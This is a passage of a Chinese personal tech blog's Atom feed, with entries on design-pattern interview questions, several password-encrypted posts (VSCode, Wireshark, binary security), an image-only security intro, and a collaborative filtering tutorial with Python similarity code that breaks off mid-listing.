    <content type="html"><![CDATA[<p>代码进阶</p><a id="more"></a><h3 id="相关面试题"><a href="#相关面试题" class="headerlink" title="相关面试题"></a>相关面试题</h3><p>原型设计模式问题：</p><ol>  <li>    <p>有请使用UML类图画出原型模式核心角色</p>  </li>  <li>    <p>原型设计模式的深拷贝和浅拷贝是什么，并写出深拷贝的两种方式的源码(重写clone方法来实现深拷贝、使用序列化来实现深拷贝)</p>  </li>  <li>    <p>在Spring框架中哪里使用到原型模式，并对源码进行分析。</p>    <figure class="highlight plain">      <table>        <tr>          <td class="gutter">            <pre><span class="line">1</span><br><span class="line">2</span><br></pre>          </td>          <td class="code">            <pre><span class="line">beans.xml</span><br><span class="line">&lt;bean id=&quot;id01&quot; class=&quot;com.atguigu.spring.bean.Monster&quot; scope=&quot;prototype&quot;/&gt;</span><br></pre>          </td>        </tr>      </table>    </figure>  </li>  <li>    <p>Spring中原型bean的创建，就是原型模式的应用。</p>  </li>  <li>    <p>代码分析+Debug源码</p>  </li>  <li>    <p>设计模式的七大原则：<br>要求：<br>a. 七大设计原则核心思想<br>b. 能够以类图的说明设计原则<br>c.      在项目实际开发中，你在哪里使用到了ocp原则。</p>  </li></ol><blockquote>  <p>设计模式常用的七大原则有：<br> 单一职责原则、接口隔离原则、依赖倒转原则、里氏替代原则、开闭原则ocp、迪米特原则、合成服用原则</p></blockquote><ol start="7">  <li>    <p>      金融借贷平台项目：<br>借贷平台的订单，有审核-发布-抢单等等步骤，随着操作的不同，会改变订单的状态，项目中的这个模块实现就会使用到状态模式，请你使用状态模式进行设计，并完成实际代码。    </p>    <p>问题分析：<br> 设计模式，实际开发经验。</p>  </li>  <li>    <p>解释器设计模式<br> a. 介绍解释器设计模式是什么？<br> b. 画出解释器设计模式的UML类图，分析设计模式中的各个角色是什么？<br>      c. 请说明Spring的框架中，哪里使用到了解释器设计模式，并做到源码级别的分析。</p>    <p> 源码剖析：</p>    <ul>      <li>Spring框架中SpelExpressionParser就使用到解释器模式</li>      <li>代码分析+Debug源码+模式角色分析说明</li>    </ul>  </li>  <li>    <p>单例设计模式一共有几种实现方式？请分别用代码实现，并说明各个实现方式的优点和缺点？</p>    <ul>      <li>饿汉式 两种</li>      <li>懒汉式 三种</li>      <li>双重检查 </li>      <li>静态内部类</li>      <li>枚举</li>    </ul>  </li></ol><h3 id="设计模式的重要性"><a href="#设计模式的重要性" class="headerlink" title="设计模式的重要性"></a>设计模式的重要性</h3><p> 软件工程中，design pattern 是对软件设计中普遍存在的各种问题，所提出的解决方案。</p><ol>  <li>客户提出新功能</li>  <li>项目开发完后，接手维护新项目</li>  <li>大厂面试</li>  <li>成为一名极客精神，独立开发</li>  <li>设计模式在软件中哪里？ 面向对象=&gt; 功能模块[设计模式+算法和数据结构]=&gt; 框架=&gt; 架构[服务器集群]</li></ol><h2 id="学习路线"><a href="#学习路线" class="headerlink" title="学习路线"></a>学习路线</h2><p>  <strong>应用场景-&gt;设计模式-&gt;剖析原理-&gt;分析实现步骤(UML图解)-&gt;代码实现-&gt;框架或项目源码分析(找到使用的地方),对步骤进行个人讲解</strong></p><h3 id="设计模式的目的"><a href="#设计模式的目的" class="headerlink" title="设计模式的目的"></a>设计模式的目的</h3><ol>  <li>    <p>代码重用性</p>  </li>  <li>    <p>可读性(编程规范性，驼峰命名法)</p>  </li>  <li>    <p>可扩展性(增加新功能，不断改进重构设计模式)</p>  </li>  <li>    <p>可靠性</p>  </li>  <li>    <p>使程序呈现高内聚、低耦合的特性</p>  </li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;代码进阶&lt;/p&gt;
    
    </summary>
    
      <category term="设计模式" scheme="http://javastar.club/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    
    
      <category term="设计模式" scheme="http://javastar.club/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>VSCode快捷键</title>
    <link href="http://javastar.club/archives/1cfdae89.html"/>
    <id>http://javastar.club/archives/1cfdae89.html</id>
    <published>2019-08-18T08:10:52.000Z</published>
    <updated>2019-08-23T03:39:17.640Z</updated>
    
    <content type="html"><![CDATA[<div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Welcome to my blog, enter password to read." />    <label for="pass">Welcome to my blog, enter password to read.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Welcome to my blog, enter password to read.
    
    </summary>
    
      <category term="VSCode" scheme="http://javastar.club/categories/VSCode/"/>
    
    
      <category term="VSCode" scheme="http://javastar.club/tags/VSCode/"/>
    
  </entry>
  
  <entry>
    <title>WireShark学习</title>
    <link href="http://javastar.club/archives/6e2df76f.html"/>
    <id>http://javastar.club/archives/6e2df76f.html</id>
    <published>2019-08-18T03:34:41.000Z</published>
    <updated>2019-08-23T03:26:23.954Z</updated>
    
    <content type="html"><![CDATA[<div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Welcome to my blog, enter password to read." />    <label for="pass">Welcome to my blog, enter password to read.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">U2FsdGVkX18/V5cIMpO+DzhSzeehB1CtHaeJ2hWqxglgH/GjpQhB7YOh5qX3PF2oheqQf94BhGo1bYuV7w+4GYRmGKWoQjtNC9IuaLl0NeGvVf7OS4rjYqqMX77kFbtDU9G7BoHLNMg1sUKYLZAh4Jj5ekfp+Zf+qOa6AjMEkfU=</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Welcome to my blog, enter password to read.
    
    </summary>
    
      <category term="wireshark" scheme="http://javastar.club/categories/wireshark/"/>
    
    
      <category term="wireshark" scheme="http://javastar.club/tags/wireshark/"/>
    
  </entry>
  
  <entry>
    <title>二进制安全基础学习</title>
    <link href="http://javastar.club/archives/217f25fc.html"/>
    <id>http://javastar.club/archives/217f25fc.html</id>
    <published>2019-08-15T07:52:20.000Z</published>
    <updated>2019-08-23T03:19:05.812Z</updated>
    
    <content type="html"><![CDATA[<div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Welcome to my blog, enter password to read." />    <label for="pass">Welcome to my blog, enter password to read.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Welcome to my blog, enter password to read.
    
    </summary>
    
      <category term="渗透学习" scheme="http://javastar.club/categories/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="二进制" scheme="http://javastar.club/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
  </entry>
  
  <entry>
    <title>网络安全入门学习</title>
    <link href="http://javastar.club/archives/aadc8bfc.html"/>
    <id>http://javastar.club/archives/aadc8bfc.html</id>
    <published>2019-08-10T14:14:07.000Z</published>
    <updated>2019-08-16T03:09:17.687Z</updated>
    
    <content type="html"><![CDATA[<p>看雪<br><img src="https://github.com/starstarb/clouding/raw/master/head/9dd29ca8fff2fd1285d5fee5086d5dab.jpg" alt></p><a id="more"></a><p>图1：<br><img src="https://github.com/starstarb/clouding/raw/master/security/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%BB%93%E6%9E%84%E5%9B%BE.jpg" alt></p><p>图2：<br><img src="https://github.com/starstarb/clouding/raw/master/security/%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E&amp;%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%8E%9F%E5%9B%BE%E5%8E%BB%E6%8E%89zip%E5%90%8E%E7%BC%80.jpg" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;看雪&lt;br&gt;&lt;img src=&quot;https://github.com/starstarb/clouding/raw/master/head/9dd29ca8fff2fd1285d5fee5086d5dab.jpg&quot; alt&gt;
&lt;/p&gt;
    
    </summary>
    
      <category term="网络安全" scheme="http://javastar.club/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络安全" scheme="http://javastar.club/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>协同过滤算法</title>
    <link href="http://javastar.club/archives/a10feb4a.html"/>
    <id>http://javastar.club/archives/a10feb4a.html</id>
    <published>2019-08-10T08:09:37.000Z</published>
    <updated>2019-08-16T03:12:08.037Z</updated>
    
    <content type="html"><![CDATA[<p>协同过滤算法:<a href="https://blog.csdn.net/DanyHgc/article/details/78910379" rel="external nofollow noopener noreferrer" target="_blank">参考</a><br><img src="https://github.com/starstarb/clouding/raw/master/head/39c919dcb1e7359106750713718e02a4.jpg" alt></p><a id="more"></a><h3 id="什么是协同过滤"><a href="#什么是协同过滤" class="headerlink" title="什么是协同过滤"></a>什么是协同过滤</h3><p>协同过滤是利用集体智慧的一个典型方法。要理解什么是协同过滤 (Collaborative Filtering, 简称  CF)，首先想一个简单的问题，如果你现在想看个电影，但你不知道具体看哪部，你会怎么做？大部分的人会问问周围的朋友，看看最近有什么好看的电影推荐，而我们一般更倾向于从口味比较类似的朋友那里得到推荐。<br>这就是协同过滤的核心思想。<br>换句话说，就是借鉴和你相关人群的观点来进行推荐，很好理解。</p><h3 id="协同过滤的实现"><a href="#协同过滤的实现" class="headerlink" title="协同过滤的实现"></a>协同过滤的实现</h3><p>要实现协同过滤的推荐算法，要进行以下三个步骤：</p><ol>  <li>收集数据</li>  <li>找到相似用户和物品</li>  <li>进行推荐</li></ol><p><strong>1 收集数据</strong></p><p>  这里的数据指的都是用户的历史行为数据，比如用户的购买历史，关注，收藏行为，或者发表了某些评论，给某个物品打了多少分等等，这些都可以用来作为数据供推荐算法使用，服务于推荐算法。需要特别指出的在于，不同的数据准确性不同，粒度也不同，在使用时需要考虑到噪音所带来的影响。</p><p><strong>2 找到相似用户和物品</strong></p><p>这一步也很简单，其实就是计算用户间以及物品间的相似度。以下是几种计算相似度的方法：<br><img src="https://github.com/starstarb/clouding/raw/master/python/20171227113119804.png" alt></p><p><strong>3 进行推荐</strong></p><p>在知道了如何计算相似度后，就可以进行推荐了。</p><p>在协同过滤中，有两种主流方法：</p><ol>  <li>基于用户的协同过滤</li>  <li>基于物品的协同过滤<br>具体怎么来阐述他们的原理呢，看个图大家就明白了</li></ol><p>基于用户的 CF  的基本思想相当简单，基于用户对物品的偏好找到相邻邻居用户，然后将邻居用户喜欢的推荐给当前用户。计算上，就是将一个用户对所有物品的偏好作为一个向量来计算用户之间的相似度，找到  K 邻居后，根据邻居的相似度权重以及他们对物品的偏好，预测当前用户没有偏好的未涉及物品，计算得到一个排序的物品列表作为推荐。 下图给出了一个例子，对于用户  A，根据用户的历史偏好，这里只计算得到一个邻居 - 用户 C，然后将用户 C 喜欢的物品 D 推荐给用户 A。<br><img src="https://github.com/starstarb/clouding/raw/master/python/xitongguolv1.png" alt></p><p> 基于物品的 CF 的原理和基于用户的 CF  类似，只是在计算邻居时采用物品本身，而不是从用户的角度，即基于用户对物品的偏好找到相似的物品，然后根据用户的历史偏好，推荐相似的物品给他。从计算的角度看，就是将所有用户对某个物品的偏好作为一个向量来计算物品之间的相似度，得到物品的相似物品后，根据用户历史的偏好预测当前用户还没有表示偏好的物品，计算得到一个排序的物品列表作为推荐。下图给出了一个例子，对于物品  A，根据所有用户的历史偏好，喜欢物品 A 的用户都喜欢物品 C，得出物品 A 和物品 C 比较相似，而用户 C 喜欢物品 A，那么可以推断出用户 C  可能也喜欢物品 C。<br><img src="https://github.com/starstarb/clouding/raw/master/python/CF1.png" alt></p><h3 id="算法存在的问题"><a href="#算法存在的问题" class="headerlink" title="算法存在的问题"></a>算法存在的问题</h3><p>这个算法实现起来也比较简单，但是在实际应用中有时候也会有问题的。</p><p>比如一些非常流行的商品可能很多人都喜欢，这种商品推荐给你就没什么意义了，所以计算的时候需要对这种商品加一个权重或者把这种商品完全去掉也行。</p><p>再有，对于一些通用的东西，比如买书的时候的工具书，如现代汉语词典，新华字典神马的，通用性太强了，推荐也没什么必要了。</p><h3 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h3><p>  　　在非社交网络的网站中，内容内在的联系是很重要的推荐原则，它比基于相似用户的推荐原则更加有效。比如在购书网站上，当你看一本书的时候，推荐引擎会给你推荐相关的书籍，这个推荐的重要性远远超过了网站首页对该用户的综合推荐。可以看到，在这种情况下，Item  CF 的推荐成为了引导用户浏览的重要手段。同时 Item CF  便于为推荐做出解释，在一个非社交网络的网站中，给某个用户推荐一本书，同时给出的解释是某某和你有相似兴趣的人也看了这本书，这很难让用户信服，因为用户可能根本不认识那个人；但如果解释说是因为这本书和你以前看的某本书相似，用户可能就觉得合理而采纳了此推荐。</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br></pre>      </td>      <td class="code">        <pre><span class="line">python2.7</span><br><span class="line"># -*- coding=utf-8 -*-</span><br><span class="line"></span><br><span class="line">import math</span><br><span class="line">import sys</span><br><span class="line">from texttable import Texttable</span><br><span class="line"></span><br><span class="line">#   使用 |A&amp;B|/sqrt(|A || B |)计算余弦距离</span><br><span class="line"></span><br><span class="line">def calcCosDistSpe(user1,user2):</span><br><span class="line">    avg_x=0.0</span><br><span class="line">    avg_y=0.0</span><br><span class="line">    for key in user1:</span><br><span class="line">        avg_x+=key[1]</span><br><span class="line">    avg_x=avg_x/len(user1)</span><br><span class="line"></span><br><span class="line">    for key in user2:</span><br><span class="line">        avg_y+=key[1]</span><br><span class="line">    avg_y=avg_y/len(user2)</span><br><span class="line"></span><br><span class="line">    u1_u2=0.0</span><br><span class="line">    for key1 in user1:</span><br><span class="line">        for key2 in user2:</span><br><span class="line">            if key1[1] &gt; avg_x and key2[1]&gt;avg_y and key1[0]==key2[0]:</span><br><span class="line">                u1_u2+=1</span><br><span class="line">    u1u2=len(user1)*len(user2)*1.0</span><br><span class="line">    sx_sy=u1_u2/math.sqrt(u1u2)</span><br><span class="line">    return sx_sy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#</span><br><span class="line">#   计算余弦距离</span><br><span class="line"></span><br><span class="line">def calcCosDist(user1,user2):</span><br><span class="line">    sum_x=0.0</span><br><span class="line">    sum_y=0.0</span><br><span class="line">    sum_xy=0.0</span><br><span class="line">    for key1 in user1:</span><br><span class="line">        for key2 in user2:</span><br><span class="line">            if key1[0]==key2[0] :</span><br><span class="line">                sum_xy+=key1[1]*key2[1]</span><br><span class="line">                sum_y+=key2[1]*key2[1]</span><br><span class="line">                sum_x+=key1[1]*key1[1]</span><br><span class="line"></span><br><span class="line">    if sum_xy == 0.0 :</span><br><span class="line">        return 0</span><br><span class="line">    sx_sy=math.sqrt(sum_x*sum_y) </span><br><span class="line">    return sum_xy/sx_sy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#</span><br><span class="line">#   相似余弦距离</span><br><span class="line"></span><br><span class="line">def calcSimlaryCosDist(user1,user2):</span><br><span class="line">    sum_x=0.0</span><br><span class="line">    sum_y=0.0</span><br><span class="line">    sum_xy=0.0</span><br><span class="line">    avg_x=0.0</span><br><span class="line">    avg_y=0.0</span><br><span class="line">    for key in user1:</span><br><span class="line">        avg_x+=key[1]</span><br><span class="line">    avg_x=avg_x/len(user1)</span><br><span class="line"></span><br><span class="line">    for key in user2:</span><br><span class="line">        avg_y+=key[1]</span><br><span class="line">    avg_y=avg_y/len(user2)</span><br><span class="line"></span><br><span class="line">    for key1 in user1:</span><br><span class="line">        for key2 in user2:</span><br><span class="line">            if key1[0]==key2[0] :</span><br><span class="line">                sum_xy+=(key1[1]-avg_x)*(key2[1]-avg_y)</span><br><span class="line">                sum_y+=(key2[1]-avg_y)*(key2[1]-avg_y)</span><br><span class="line">        sum_x+=(key1[1]-avg_x)*(key1[1]-avg_x)</span><br><span class="line"></span><br><span class="line">    if sum_xy == 0.0 :</span><br><span class="line">        return 0</span><br><span class="line">    sx_sy=math.sqrt(sum_x*sum_y) </span><br><span class="line">    return sum_xy/sx_sy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#</span><br><span class="line">#   读取文件</span><br><span class="line"></span><br><span class="line">def readFile(file_name):</span><br><span class="line">    contents_lines=[]</span><br><span class="line">    f=open(file_name,&quot;r&quot;)</span><br><span class="line">    contents_lines=f.readlines()</span><br><span class="line">    f.close()</span><br><span class="line">    return contents_lines</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line">#   解压rating信息，格式：用户id\t硬盘id\t用户rating\t时间</span><br><span class="line">#   输入：数据集合</span><br><span class="line">#   输出:已经解压的排名信息</span><br><span class="line">#</span><br><span class="line">def getRatingInformation(ratings):</span><br><span class="line">    rates=[]</span><br><span class="line">    for line in ratings:</span><br><span class="line">        rate=line.split(&quot;\t&quot;)</span><br><span class="line">        rates.append([int(rate[0]),int(rate[1]),int(rate[2])])</span><br><span class="line">    return rates</span><br><span class="line"></span><br><span class="line"></span><br><span 